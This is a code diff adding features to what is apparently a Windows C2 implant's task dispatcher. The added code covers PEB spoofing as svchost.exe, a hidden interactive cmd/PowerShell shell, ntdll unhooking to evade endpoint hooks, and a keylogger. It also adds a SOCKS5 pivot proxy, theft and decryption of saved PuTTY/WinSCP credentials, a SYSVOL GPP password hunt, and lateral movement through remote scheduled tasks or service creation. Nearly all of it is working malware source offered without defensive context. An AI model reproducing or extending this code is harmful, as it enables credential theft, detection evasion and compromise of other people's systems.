+        json_get_str(args,"path",peb_path,sizeof(peb_path),"C:\\Windows\\System32\\svchost.exe");
+        typedef NTSTATUS (WINAPI *pfnNtQIP)(HANDLE,ULONG,PVOID,ULONG,PULONG);
+        HMODULE hntdll2 = GetModuleHandleA("ntdll.dll");
+        pfnNtQIP NtQIP2 = hntdll2 ? (pfnNtQIP)GetProcAddress(hntdll2,"NtQueryInformationProcess") : NULL;
+        if (!NtQIP2) { agent_send_result(task->id,"","NtQueryInformationProcess unavailable"); return; }
+        PROCESS_BASIC_INFORMATION pbi2 = {0};
+        ULONG rlen2 = 0;
+        NTSTATUS pst = NtQIP2(GetCurrentProcess(),0,&pbi2,sizeof(pbi2),&rlen2);
+        if (!NT_SUCCESS(pst)) {
+            char e[64]; snprintf(e,sizeof(e),"NtQIP failed 0x%lx",(unsigned long)pst);
+            agent_send_result(task->id,"",e); return;
+        }
+        PEB *peb2 = pbi2.PebBaseAddress;
+        RTL_USER_PROCESS_PARAMETERS *pp = peb2->ProcessParameters;
+        WCHAR wpath2[MAX_PATH] = {0};
+        int wlen2 = MultiByteToWideChar(CP_ACP,0,peb_path,-1,wpath2,MAX_PATH) - 1;
+        if (wlen2 <= 0) { agent_send_result(task->id,"","MultiByteToWideChar failed"); return; }
+        size_t wbytes2 = (size_t)(wlen2+1)*sizeof(WCHAR);
+        WCHAR *nbuf = (WCHAR*)VirtualAlloc(NULL,wbytes2,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+        if (!nbuf) { agent_send_result(task->id,"","VirtualAlloc failed"); return; }
+        memcpy(nbuf,wpath2,wbytes2);
+        DWORD oprot;
+        VirtualProtect(&pp->ImagePathName,sizeof(UNICODE_STRING),PAGE_READWRITE,&oprot);
+        pp->ImagePathName.Length      = (USHORT)(wlen2*sizeof(WCHAR));
+        pp->ImagePathName.MaximumLength = (USHORT)wbytes2;
+        pp->ImagePathName.Buffer      = nbuf;
+        VirtualProtect(&pp->ImagePathName,sizeof(UNICODE_STRING),oprot,&oprot);
+        VirtualProtect(&pp->CommandLine,sizeof(UNICODE_STRING),PAGE_READWRITE,&oprot);
+        pp->CommandLine.Length        = (USHORT)(wlen2*sizeof(WCHAR));
+        pp->CommandLine.MaximumLength = (USHORT)wbytes2;
+        pp->CommandLine.Buffer        = nbuf;
+        VirtualProtect(&pp->CommandLine,sizeof(UNICODE_STRING),oprot,&oprot);
+        char out4[512]; snprintf(out4,sizeof(out4),"[+] PEB spoofed to %s",peb_path);
+        agent_send_result(task->id,out4,"");
+    }
+    // ── FEATURE 4: Interactive shell ─────────────────────────────────────────
+    else if (strcmp(type_upper, "ISHELL_OPEN") == 0) {
+        if (g_ishell_proc) {
+            agent_send_result(task->id,"","ISHELL already open; run ISHELL_CLOSE first"); return;
+        }
+        char shell_name[64] = {0};
+        json_get_str(args,"shell",shell_name,sizeof(shell_name),"cmd");
+        char shell_cmd[256];
+        if (_stricmp(shell_name,"powershell") == 0)
+            strncpy(shell_cmd,"powershell.exe",sizeof(shell_cmd)-1);
+        else
+            strncpy(shell_cmd,"cmd.exe",sizeof(shell_cmd)-1);
+        SECURITY_ATTRIBUTES sa2 = {sizeof(SECURITY_ATTRIBUTES),NULL,TRUE};
+        HANDLE hStdinR=NULL,hStdinW=NULL,hStdoutR=NULL,hStdoutW=NULL;
+        CreatePipe(&hStdinR,&hStdinW,&sa2,0);
+        CreatePipe(&hStdoutR,&hStdoutW,&sa2,0);
+        SetHandleInformation(hStdinW,HANDLE_FLAG_INHERIT,0);
+        SetHandleInformation(hStdoutR,HANDLE_FLAG_INHERIT,0);
+        STARTUPINFOA isi = {0}; isi.cb=sizeof(isi);
+        isi.hStdInput=hStdinR; isi.hStdOutput=hStdoutW; isi.hStdError=hStdoutW;
+        isi.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW; isi.wShowWindow=SW_HIDE;
+        PROCESS_INFORMATION ipi = {0};
+        if (!CreateProcessA(NULL,shell_cmd,NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&isi,&ipi)) {
+            CloseHandle(hStdinR); CloseHandle(hStdinW);
+            CloseHandle(hStdoutR); CloseHandle(hStdoutW);
+            char e[64]; snprintf(e,sizeof(e),"CreateProcess failed %lu",GetLastError());
+            agent_send_result(task->id,"",e); return;
+        }
+        CloseHandle(ipi.hThread);
+        CloseHandle(hStdinR);
+        CloseHandle(hStdoutW);
+        g_ishell_proc     = ipi.hProcess;
+        g_ishell_stdin_w  = hStdinW;
+        g_ishell_stdout_r = hStdoutR;
+        char out5[64]; snprintf(out5,sizeof(out5),"[+] ishell opened (%s)",shell_cmd);
+        agent_send_result(task->id,out5,"");
+    }
+    else if (strcmp(type_upper, "ISHELL_RUN") == 0) {
+        if (!g_ishell_proc) { agent_send_result(task->id,"","no active ishell; run ISHELL_OPEN first"); return; }
+        char ish_cmd[4096] = {0};
+        json_get_str(args,"cmd",ish_cmd,sizeof(ish_cmd)-3,"");
+        size_t clen = strlen(ish_cmd);
+        ish_cmd[clen++] = '\r'; ish_cmd[clen++] = '\n'; ish_cmd[clen] = '\0';
+        DWORD written2 = 0;
+        WriteFile(g_ishell_stdin_w,ish_cmd,(DWORD)clen,&written2,NULL);
+        Sleep(750);
+        char *ish_out = (char*)malloc(65536);
+        if (!ish_out) { agent_send_result(task->id,"","oom"); return; }
+        int ish_len = 0;
+        DWORD avail2 = 0;
+        while (ish_len < 65534 &&
+               PeekNamedPipe(g_ishell_stdout_r,NULL,0,NULL,&avail2,NULL) && avail2 > 0) {
+            DWORD to_rd = avail2 < (DWORD)(65534-ish_len) ? avail2 : (DWORD)(65534-ish_len);
+            DWORD actually_rd = 0;
+            if (!ReadFile(g_ishell_stdout_r,ish_out+ish_len,to_rd,&actually_rd,NULL)) break;
+            ish_len += (int)actually_rd;
+            avail2 = 0;
+        }
+        ish_out[ish_len] = '\0';
+        agent_send_result(task->id,ish_out,""); free(ish_out);
+    }
+    else if (strcmp(type_upper, "ISHELL_CLOSE") == 0) {
+        if (!g_ishell_proc) { agent_send_result(task->id,"","no active ishell"); return; }
+        TerminateProcess(g_ishell_proc,0);
+        CloseHandle(g_ishell_proc); g_ishell_proc=NULL;
+        if (g_ishell_stdin_w)  { CloseHandle(g_ishell_stdin_w);  g_ishell_stdin_w=NULL; }
+        if (g_ishell_stdout_r) { CloseHandle(g_ishell_stdout_r); g_ishell_stdout_r=NULL; }
+        agent_send_result(task->id,"[+] ishell closed","");
+    }
+    // ── FEATURE 5: NTDLL_UNHOOK ──────────────────────────────────────────────
+    else if (strcmp(type_upper, "NTDLL_UNHOOK") == 0) {
+        HMODULE hCur = GetModuleHandleW(L"ntdll.dll");
+        HMODULE hFresh = LoadLibraryExW(L"ntdll.dll",NULL,DONT_RESOLVE_DLL_REFERENCES);
+        if (!hCur || !hFresh) {
+            if (hFresh) FreeLibrary(hFresh);
+            agent_send_result(task->id,"","failed to get ntdll handles"); return;
+        }
+        BYTE *fresh  = (BYTE*)hFresh;
+        BYTE *current = (BYTE*)hCur;
+        IMAGE_DOS_HEADER *dos2 = (IMAGE_DOS_HEADER*)fresh;
+        IMAGE_NT_HEADERS *nt2  = (IMAGE_NT_HEADERS*)(fresh + dos2->e_lfanew);
+        IMAGE_DATA_DIRECTORY *expd = &nt2->OptionalHeader.DataDirectory[0];
+        int unhooked = 0;
+        if (expd->VirtualAddress) {
+            IMAGE_EXPORT_DIRECTORY *exp2 = (IMAGE_EXPORT_DIRECTORY*)(fresh + expd->VirtualAddress);
+            DWORD *names2 = (DWORD*)(fresh + exp2->AddressOfNames);
+            DWORD *funcs2 = (DWORD*)(fresh + exp2->AddressOfFunctions);
+            WORD  *ords2  = (WORD*)(fresh  + exp2->AddressOfNameOrdinals);
+            for (DWORD ei = 0; ei < exp2->NumberOfNames; ei++) {
+                const char *fname = (const char*)(fresh + names2[ei]);
+                if (fname[0] != 'N' || fname[1] != 't') continue;
+                DWORD frva = funcs2[ords2[ei]];
+                BYTE *fresh_fn   = fresh   + frva;
+                BYTE *cur_fn     = current + frva;
+                if (cur_fn[0] == 0xE9) { /* JMP = hooked */
+                    DWORD oprot2 = 0;
+                    if (VirtualProtect(cur_fn,16,PAGE_EXECUTE_READWRITE,&oprot2)) {
+                        memcpy(cur_fn,fresh_fn,16);
+                        VirtualProtect(cur_fn,16,oprot2,&oprot2);
+                        unhooked++;
+                    }
+                }
+            }
+        }
+        FreeLibrary(hFresh);
+        char out6[64]; snprintf(out6,sizeof(out6),"[+] unhooked %d Nt* functions",unhooked);
+        agent_send_result(task->id,out6,"");
+    }
+    // ── FEATURE 6: Keylogger ─────────────────────────────────────────────────
+    else if (strcmp(type_upper, "KEYLOG_START") == 0) {
+        if (g_keylog_thread && !g_keylog_stop) {
+            agent_send_result(task->id,"","keylogger already running"); return;
+        }
+        g_keylog_len  = 0;
+        g_keylog_stop = 1;
+        g_keyhook     = NULL;
+        g_keylog_thread = CreateThread(NULL,0,KeylogThread,NULL,0,&g_keylog_tid);
+        if (!g_keylog_thread) {
+            char e[64]; snprintf(e,sizeof(e),"CreateThread failed %lu",GetLastError());
+            agent_send_result(task->id,"",e);
+        } else {
+            agent_send_result(task->id,"[+] keylogger started","");
+        }
+    }
+    else if (strcmp(type_upper, "KEYLOG_STOP") == 0) {
+        g_keylog_stop = 1;
+        if (g_keylog_tid) PostThreadMessageW(g_keylog_tid,WM_QUIT,0,0);
+        if (g_keylog_thread) {
+            WaitForSingleObject(g_keylog_thread,3000);
+            CloseHandle(g_keylog_thread); g_keylog_thread=NULL;
+        }
+        g_keylog_tid = 0;
+        agent_send_result(task->id,"[+] keylogger stopped","");
+    }
+    else if (strcmp(type_upper, "KEYLOG_DUMP") == 0) {
+        g_keylog_buf[g_keylog_len] = '\0';
+        agent_send_result(task->id,g_keylog_buf,"");
+        g_keylog_len = 0;
+    }
+    // ── FEATURE 7: SOCKS5 proxy ──────────────────────────────────────────────
+    else if (strcmp(type_upper, "SOCKS_START") == 0) {
+        if (!g_socks_stop) { agent_send_result(task->id,"","SOCKS5 already running"); return; }
+        int socks_port = json_get_int(args,"port",1080);
+        WSADATA wsd; WSAStartup(MAKEWORD(2,2),&wsd);
+        g_socks_listen = socket(AF_INET,SOCK_STREAM,0);
+        if (g_socks_listen==INVALID_SOCKET) {
+            agent_send_result(task->id,"","socket() failed"); return;
+        }
+        int reuse=1; setsockopt(g_socks_listen,SOL_SOCKET,SO_REUSEADDR,(char*)&reuse,sizeof(reuse));
+        struct sockaddr_in sa_in;
+        memset(&sa_in,0,sizeof(sa_in));
+        sa_in.sin_family=AF_INET; sa_in.sin_port=htons((u_short)socks_port);
+        sa_in.sin_addr.s_addr=INADDR_ANY;
+        if (bind(g_socks_listen,(struct sockaddr*)&sa_in,sizeof(sa_in))!=0 ||
+            listen(g_socks_listen,64)!=0) {
+            closesocket(g_socks_listen); g_socks_listen=INVALID_SOCKET;
+            char e[64]; snprintf(e,sizeof(e),"bind/listen failed %d",WSAGetLastError());
+            agent_send_result(task->id,"",e); return;
+        }
+        g_socks_stop   = 0;
+        g_socks_thread = CreateThread(NULL,0,SocksListenThread,NULL,0,NULL);
+        if (!g_socks_thread) {
+            g_socks_stop = 1; closesocket(g_socks_listen); g_socks_listen=INVALID_SOCKET;
+            char e[64]; snprintf(e,sizeof(e),"CreateThread failed %lu",GetLastError());
+            agent_send_result(task->id,"",e); return;
+        }
+        char out7[64]; snprintf(out7,sizeof(out7),"[+] SOCKS5 listening on port %d",socks_port);
+        agent_send_result(task->id,out7,"");
+    }
+    else if (strcmp(type_upper, "SOCKS_STOP") == 0) {
+        g_socks_stop = 1;
+        if (g_socks_listen!=INVALID_SOCKET) { closesocket(g_socks_listen); g_socks_listen=INVALID_SOCKET; }
+        if (g_socks_thread) {
+            WaitForSingleObject(g_socks_thread,3000);
+            CloseHandle(g_socks_thread); g_socks_thread=NULL;
+        }
+        agent_send_result(task->id,"[+] SOCKS5 stopped","");
+    }
+    // ── FEATURE 8: SESSION_GOPHER ─────────────────────────────────────────────
+    else if (strcmp(type_upper, "SESSION_GOPHER") == 0) {
+        size_t sg_cap=65536, sg_len=0;
+        char *sg_out = (char*)malloc(sg_cap);
+        if (!sg_out) { agent_send_result(task->id,"","oom"); return; }
+        sg_out[0]='\0';
+        HKEY hk2;
+        /* PuTTY sessions */
+        if (RegOpenKeyExA(HKEY_CURRENT_USER,
+                "Software\\SimonTatham\\PuTTY\\Sessions",0,KEY_READ,&hk2)==ERROR_SUCCESS) {
+            const char *hdr2="=== PuTTY Sessions ===\n";
+            size_t hl2=strlen(hdr2);
+            if (sg_len+hl2<sg_cap){memcpy(sg_out+sg_len,hdr2,hl2);sg_len+=hl2;}
+            DWORD idx2=0; char sn[512]; DWORD sl2=sizeof(sn);
+            while (RegEnumKeyExA(hk2,idx2++,sn,&sl2,NULL,NULL,NULL,NULL)==ERROR_SUCCESS) {
+                HKEY hses2;
+                char fk[640];
+                snprintf(fk,sizeof(fk),"Software\\SimonTatham\\PuTTY\\Sessions\\%s",sn);
+                if (RegOpenKeyExA(HKEY_CURRENT_USER,fk,0,KEY_READ,&hses2)==ERROR_SUCCESS) {
+                    char hn[256]={0},un[256]={0}; DWORD pn=22;
+                    DWORD vs=sizeof(hn);
+                    RegQueryValueExA(hses2,"HostName",NULL,NULL,(LPBYTE)hn,&vs);
+                    vs=sizeof(un);
+                    RegQueryValueExA(hses2,"UserName",NULL,NULL,(LPBYTE)un,&vs);
+                    vs=sizeof(pn);
+                    RegQueryValueExA(hses2,"PortNumber",NULL,NULL,(LPBYTE)&pn,&vs);
+                    RegCloseKey(hses2);
+                    char ent[512];
+                    int el3=(int)snprintf(ent,sizeof(ent),"  [%s] %s@%s:%lu\n",
+                        sn,un[0]?un:"(none)",hn[0]?hn:"(none)",(unsigned long)pn);
+                    if (el3>0&&sg_len+(size_t)el3<sg_cap){memcpy(sg_out+sg_len,ent,el3);sg_len+=el3;}
+                }
+                sl2=sizeof(sn);
+            }
+            RegCloseKey(hk2);
+        }
+        /* WinSCP sessions */
+        if (RegOpenKeyExA(HKEY_CURRENT_USER,
+                "Software\\Martin Prikryl\\WinSCP 2\\Sessions",0,KEY_READ,&hk2)==ERROR_SUCCESS) {
+            const char *hdr3="=== WinSCP Sessions ===\n";
+            size_t hl3=strlen(hdr3);
+            if (sg_len+hl3<sg_cap){memcpy(sg_out+sg_len,hdr3,hl3);sg_len+=hl3;}
+            DWORD idx3=0; char sn2[512]; DWORD sl3=sizeof(sn2);
+            while (RegEnumKeyExA(hk2,idx3++,sn2,&sl3,NULL,NULL,NULL,NULL)==ERROR_SUCCESS) {
+                HKEY hses3;
+                char fk2[640];
+                snprintf(fk2,sizeof(fk2),"Software\\Martin Prikryl\\WinSCP 2\\Sessions\\%s",sn2);
+                if (RegOpenKeyExA(HKEY_CURRENT_USER,fk2,0,KEY_READ,&hses3)==ERROR_SUCCESS) {
+                    char hn2[256]={0},un2[256]={0},pw_hex[2048]={0};
+                    DWORD vs2=sizeof(hn2);
+                    RegQueryValueExA(hses3,"HostName",NULL,NULL,(LPBYTE)hn2,&vs2);
+                    vs2=sizeof(un2);
+                    RegQueryValueExA(hses3,"UserName",NULL,NULL,(LPBYTE)un2,&vs2);
+                    vs2=sizeof(pw_hex);
+                    RegQueryValueExA(hses3,"Password",NULL,NULL,(LPBYTE)pw_hex,&vs2);
+                    RegCloseKey(hses3);
+                    /* Decrypt WinSCP password: nibble-swap then XOR 0xA3, skip 3-byte header */
+                    char decpw[512]={0}; int dplen=0;
+                    const char *hp=pw_hex;
+                    while (hp[0]&&hp[1]&&dplen<(int)sizeof(decpw)-1) {
+                        unsigned int b2=0; sscanf(hp,"%2x",&b2); hp+=2;
+                        decpw[dplen++]=(char)((((b2&0x0F)<<4)|((b2&0xF0)>>4))^0xA3);
+                    }
+                    decpw[dplen]='\0';
+                    char *pw_out2 = (dplen>3) ? decpw+3 : decpw;
+                    char ent2[768];
+                    int el4=(int)snprintf(ent2,sizeof(ent2),"  [%s] %s@%s pass=%s\n",
+                        sn2,un2[0]?un2:"(none)",hn2[0]?hn2:"(none)",
+                        pw_out2[0]?pw_out2:"(none)");
+                    if (el4>0&&sg_len+(size_t)el4<sg_cap){memcpy(sg_out+sg_len,ent2,el4);sg_len+=el4;}
+                }
+                sl3=sizeof(sn2);
+            }
+            RegCloseKey(hk2);
+        }
+        sg_out[sg_len]='\0';
+        if (!sg_len) strncpy(sg_out,"(no sessions found)",sg_cap-1);
+        agent_send_result(task->id,sg_out,""); free(sg_out);
+    }
+    // ── FEATURE 9: GPP_HUNT ──────────────────────────────────────────────────
+    else if (strcmp(type_upper, "GPP_HUNT") == 0) {
+        char *xml_list = run_shell("dir /s /b \\\\%LOGONSERVER%\\SYSVOL\\*.xml 2>nul");
+        if (!xml_list) { agent_send_result(task->id,"","dir failed"); return; }
+        size_t gpp_cap=65536, gpp_len=0;
+        char *gpp_out=(char*)malloc(gpp_cap);
+        if (!gpp_out) { free(xml_list); agent_send_result(task->id,"","oom"); return; }
+        gpp_out[0]='\0';
+        char *xline=strtok(xml_list,"\r\n");
+        while (xline) {
+            /* Trim trailing whitespace */
+            size_t xl=strlen(xline);
+            while (xl>0 && (xline[xl-1]=='\r'||xline[xl-1]=='\n'||xline[xl-1]==' ')) xline[--xl]='\0';
+            if (xl==0) { xline=strtok(NULL,"\r\n"); continue; }
+            HANDLE hxf=CreateFileA(xline,GENERIC_READ,FILE_SHARE_READ,NULL,
+                                   OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
+            if (hxf!=INVALID_HANDLE_VALUE) {
+                DWORD fsz=GetFileSize(hxf,NULL);
+                if (fsz>0&&fsz<(10*1024*1024)) {
+                    char *xdata=(char*)malloc(fsz+1);
+                    DWORD rd2=0;
+                    if (xdata&&ReadFile(hxf,xdata,fsz,&rd2,NULL)) {
+                        xdata[rd2]='\0';
+                        char *cp=xdata;
+                        while ((cp=strstr(cp,"cpassword=\""))!=NULL) {
+                            cp+=11;
+                            char *ce=strchr(cp,'"');
+                            if (!ce) break;
+                            size_t cvlen=(size_t)(ce-cp);
+                            char *b64v=(char*)malloc(cvlen+1);
+                            if (b64v) {
+                                memcpy(b64v,cp,cvlen); b64v[cvlen]='\0';
+                                /* Find nearby userName */
+                                char uname2[256]="";
+                                char *ctx2 = cp-500; if(ctx2<xdata) ctx2=xdata;
+                                char *up3=strstr(ctx2,"userName=\"");
+                                if (up3&&up3<cp+200) {
+                                    up3+=10; char *ue2=strchr(up3,'"');
+                                    if (ue2&&(size_t)(ue2-up3)<sizeof(uname2)) {
+                                        memcpy(uname2,up3,(size_t)(ue2-up3));
+                                        uname2[(size_t)(ue2-up3)]='\0';
+                                    }
+                                }
+                                char *decpw2=gpp_decrypt_cpassword(b64v);
+                                char gent[1024];
+                                int gel=(int)snprintf(gent,sizeof(gent),
+                                    "[GPP] file=%s user=%s pass=%s\n",
+                                    xline,uname2[0]?uname2:"(unknown)",
+                                    decpw2?decpw2:"?");
+                                if (gel>0&&gpp_len+(size_t)gel<gpp_cap){
+                                    memcpy(gpp_out+gpp_len,gent,gel); gpp_len+=gel;
+                                }
+                                free(b64v); free(decpw2);
+                            }
+                            cp=ce+1;
+                        }
+                    }
+                    free(xdata);
+                }
+                CloseHandle(hxf);
+            }
+            xline=strtok(NULL,"\r\n");
+        }
+        free(xml_list);
+        gpp_out[gpp_len]='\0';
+        if (!gpp_len) strncpy(gpp_out,"(no GPP passwords found)",gpp_cap-1);
+        agent_send_result(task->id,gpp_out,""); free(gpp_out);
+    }
+    // ── FEATURE 10: LATERAL ──────────────────────────────────────────────────
+    else if (strcmp(type_upper, "LATERAL") == 0) {
+        char lat_method[32]={0},lat_host[256]={0},lat_user[256]={0};
+        char lat_pass[256]={0},lat_cmd[1024]={0};
+        json_get_str(args,"method",lat_method,sizeof(lat_method),"atexec");
+        json_get_str(args,"host",lat_host,sizeof(lat_host),"");
+        json_get_str(args,"user",lat_user,sizeof(lat_user),"");
+        json_get_str(args,"pass",lat_pass,sizeof(lat_pass),"");
+        json_get_str(args,"cmd",lat_cmd,sizeof(lat_cmd),"whoami");
+        if (!lat_host[0]) { agent_send_result(task->id,"","LATERAL: host required"); return; }
+        char lat_buf[4096];
+        if (_stricmp(lat_method,"atexec")==0) {
+            /* Authenticate */
+            snprintf(lat_buf,sizeof(lat_buf),
+                "net use \\\\%s\\IPC$ \"%s\" /user:\"%s\" 2>&1",lat_host,lat_pass,lat_user);
+            char *lr1=run_shell(lat_buf); free(lr1);
+            /* Output file */
+            char outf[512];
+            snprintf(outf,sizeof(outf),"\\\\%s\\admin$\\__eg_out_%lu.txt",
+                lat_host,(unsigned long)GetCurrentProcessId());
+            /* Create task */
+            snprintf(lat_buf,sizeof(lat_buf),
+                "schtasks /Create /S %s /RU SYSTEM /SC ONCE /ST 00:00 /F "
+                "/TN endgame_lat /TR \"cmd /c %s > %s 2>&1\" 2>&1",
+                lat_host,lat_cmd,outf);
+            char *lr2=run_shell(lat_buf); free(lr2);
+            /* Run task */
+            snprintf(lat_buf,sizeof(lat_buf),
+                "schtasks /Run /S %s /TN endgame_lat 2>&1",lat_host);
+            char *lr3=run_shell(lat_buf); free(lr3);
+            Sleep(5000);
+            /* Read output */
+            snprintf(lat_buf,sizeof(lat_buf),"type \"%s\" 2>&1",outf);
+            char *lat_result=run_shell(lat_buf);
+            agent_send_result(task->id,lat_result?lat_result:"(no output)","");
+            free(lat_result);
+            /* Cleanup */
+            snprintf(lat_buf,sizeof(lat_buf),
+                "schtasks /Delete /S %s /TN endgame_lat /F 2>&1",lat_host);
+            char *lr4=run_shell(lat_buf); free(lr4);
+            DeleteFileA(outf);
+            snprintf(lat_buf,sizeof(lat_buf),"net use \\\\%s\\IPC$ /del /y 2>&1",lat_host);
+            char *lr5=run_shell(lat_buf); free(lr5);
+        } else if (_stricmp(lat_method,"psexec")==0) {
+            /* Authenticate */
+            snprintf(lat_buf,sizeof(lat_buf),
+                "net use \\\\%s\\IPC$ \"%s\" /user:\"%s\" 2>&1",lat_host,lat_pass,lat_user);
+            char *lr6=run_shell(lat_buf); free(lr6);
+            /* Copy current exe to remote ADMIN$ */
+            char exe_self[MAX_PATH]={0};
+            GetModuleFileNameA(NULL,exe_self,sizeof(exe_self));
+            char remote_bin[MAX_PATH];
+            snprintf(remote_bin,sizeof(remote_bin),"\\\\%s\\ADMIN$\\endgame_psvc.exe",lat_host);
+            CopyFileA(exe_self,remote_bin,FALSE);
+            /* Open remote SCM */
+            WCHAR whost2[256]={0};
+            MultiByteToWideChar(CP_ACP,0,lat_host,-1,whost2,256);
+            SC_HANDLE hScm2=OpenSCManagerW(whost2,NULL,SC_MANAGER_ALL_ACCESS);
+            if (!hScm2) {
+                char e[64]; snprintf(e,sizeof(e),"OpenSCManager failed %lu",GetLastError());
+                agent_send_result(task->id,"",e); return;
+            }
+            SC_HANDLE hSvc2=CreateServiceW(hScm2,L"endgame_psvc",L"Endgame Svc",
+                SERVICE_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS,SERVICE_DEMAND_START,
+                SERVICE_ERROR_IGNORE,L"C:\\Windows\\endgame_psvc.exe",
+                NULL,NULL,NULL,NULL,NULL);
+            if (!hSvc2) {
+                char e[64]; snprintf(e,sizeof(e),"CreateService failed %lu",GetLastError());
+                CloseServiceHandle(hScm2);
+                agent_send_result(task->id,"",e); return;
+            }
+            StartServiceW(hSvc2,0,NULL);
+            Sleep(5000);
+            ControlService(hSvc2,SERVICE_CONTROL_STOP,NULL);
+            DeleteService(hSvc2);
+            CloseServiceHandle(hSvc2);
+            CloseServiceHandle(hScm2);
+            /* Cleanup */
+            snprintf(lat_buf,sizeof(lat_buf),"net use \\\\%s\\IPC$ /del /y 2>&1",lat_host);
+            char *lr7=run_shell(lat_buf); free(lr7);
+            agent_send_result(task->id,"[+] psexec: service started and cleaned","");
+        } else {
+            char e2[128]; snprintf(e2,sizeof(e2),"unknown lateral method: %s",lat_method);
+            agent_send_result(task->id,"",e2);
+        }
     }
     else {
         char err[128];
